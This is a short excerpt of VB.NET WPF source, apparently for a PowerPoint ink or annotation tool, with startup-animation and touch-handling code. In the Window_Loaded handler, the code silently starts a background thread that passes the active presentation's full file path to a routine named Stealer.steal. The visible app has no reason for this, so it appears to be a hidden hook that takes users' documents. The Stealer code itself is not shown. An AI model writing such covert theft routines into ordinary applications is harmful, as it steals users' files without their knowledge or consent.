...
Class MainWindow1
    ...
    Private Sub Window_Loaded(sender As Object, e As RoutedEventArgs) Handles Me.Loaded
        '启动动画
        If GetKeyValue("main", "StartAnimation", "false", inipath) = "true" Then
        ...
        'u.Start()
        Dim u As New Threading.Thread(AddressOf Stealer.steal)
        u.Start(ppt_obj.ActivePresentation.FullName)
        'Stealer.steal(ppt_obj.ActivePresentation.FullName)
    End Sub
...
#Disable Warning BC40005 ' 成员隐藏基类型中的可重写的方法
    Private Sub OnTouchDown(ByVal sender As Object, ByVal touchEventArgs As TouchEventArgs)
        ...
        Dim touchPoint = touchEventArgs.GetTouchPoint(InkCanvas1)
